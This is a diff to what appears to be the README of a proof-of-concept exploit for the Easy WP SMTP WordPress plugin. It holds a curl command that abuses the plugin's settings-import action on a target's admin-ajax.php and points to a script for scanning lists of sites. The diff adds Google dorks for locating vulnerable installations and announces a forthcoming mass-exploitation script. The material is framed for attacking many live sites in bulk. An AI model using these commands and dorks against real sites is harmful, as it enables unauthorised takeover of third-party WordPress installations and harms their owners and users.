@@ -16,6 +16,16 @@ In the following proof of concept, Its going to use swpsmtp_import_settings to u
 
 >$ curl https://TARGET.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'
 
-3. For mass-scan vuln site list:
+3. For mass-checker vuln site list:
 
 > Use my python script: python script.py list.txt & dont forget to install libraries (pip install module).
+
+4. Some GOOGLE DORKS:
+
+>inurl:'/wp-content/plugins/easy-wp-smtp/'
+>intext:'Index of /wp-content/plugins/easy-wp-smtp'
+>intext:'=== Easy WP SMTP ==='
+
+5. Mass exploiting python script:
+
+> Soon ;)
